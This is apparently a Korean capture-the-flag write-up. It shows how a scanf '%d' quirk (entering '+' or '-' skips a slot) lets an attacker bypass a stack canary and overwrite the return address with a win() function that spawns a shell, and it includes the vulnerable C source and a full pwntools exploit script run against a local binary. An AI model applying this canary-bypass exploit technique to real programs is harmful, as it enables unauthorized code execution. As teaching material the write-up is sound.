scanf의 서식문자에 맞지 않는 문자를 넣으면 버퍼링이 걸려서 입력을 들어가지 않고 바로 나가진다. 
```c
scanf("%d", a) //문자를 넣을경우 바로 나가진다. 
```
그러면 해당 문제를 봐보자.
```C
#include <stdio.h>
  
void win()
{
    execve("/bin/sh", 0 ,0);
}
  
int main(){
    int a[4] = {5555, 4444, 3333, 2222};
    int num;
  
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
  
    printf("win : %p\n", win);
  
    printf("how many do you want to input? > ");
    scanf("%d", &num);
  
    for(int i = 0; i < num; ++i)
    {
        printf("buf[%d] >> ", i);
        scanf("%d", &a[i]);
    }
    printf("result\n");
    for(int i = 0; i < num; ++i)
        printf("buf[%d] >> %d\n", i, a[i]);
  
    return 0;
}
```

checksec
![](https://i.imgur.com/OrA6FKH.png)

해당 코드는 a배열에 0,1,2,3 index를 참조하여 값을 바꿀 수 있다. 그런데 num을 사용자의 입력을 받기 때문에 buffer overflow가 발생할 수 있다. 하지만 canary가 적용되어있기 때문에 overflow가 불가능할 것 같아보인다. 
여기서 한번 4를 입력하고 1111,2222,3333,4444를 입력해보자.
![](https://i.imgur.com/76HBaEJ.png)

1111,2222,3333,4444 로 바뀌어있다.

그럼 a 를 입력해보자.
![](https://i.imgur.com/FcGecsU.png)
바로 나가지며 이상하게 끝나며 b\[0]에 값이 들어가지 않는다.
그러면 한번 +혹은 - 를 입력해보자
![](https://i.imgur.com/F3ly9MY.png)
나가지지 않고 대신 아무것도 입력되지 않은채 다음 index로 넘어간다.
즉 우리는 아무 입력도 하지 않고 다음 index로 넘어갈 수 있다는 것이다. 
한번 1111, + , - ,4444 를 입력해보자
![](https://i.imgur.com/Js7jA9E.png)
1과 4만 값을 바꿀 수 있다. 즉 우리는 이를 이용해서 canary를 건들이지 않고 ret에 접근할 수 있다는 것이다.
해당 코드를 풀어보자.
![](https://i.imgur.com/NBJaVpX.png)
buffer의 크기는 0x18 로 한 번 입력이 4바이트이니 6번을 입력해야 한다. 그리고 canary부분은 +혹은 - 로 넘어간 후 sfp는 아무값으로 채우고 ret을 win 주소로 overwrite하면 셸을 딸 수 있다. 이 때 주소는 8바이트고 한 번 입력에 4바이트씩 입력하니 하위 4바이트 입력 이후 상위 2바이트를 입력한다.

```python
from pwn import *
  
# context.log_level = 'debug'
  
p = process("./sc")
  
p.recvuntil(b': 0x')
win_add = int(p.recv(12), 16)
  
p.sendlineafter("> ", b'12')
  
p.sendlineafter(">> ", b'1111')
p.sendlineafter(">> ", b'2222')
p.sendlineafter(">> ", b'3333')
p.sendlineafter(">> ", b'4444')
p.sendlineafter(">> ", b'5555')
p.sendlineafter(">> ", b'6666')
p.sendlineafter(">> ", b'+')
p.sendlineafter(">> ", b'+')
p.sendlineafter(">> ", b'7777')
p.sendlineafter(">> ", b'8888')
  
win_add_under_8 = win_add % 0x100000000
win_add_on_4 = win_add // 0x100000000
  
 
p.sendlineafter(">> ", str(win_add_under_8))
p.sendlineafter(">> ", str(win_add_on_4))
  
 
p.interactive()
```

![](https://i.imgur.com/b4oeC28.png)

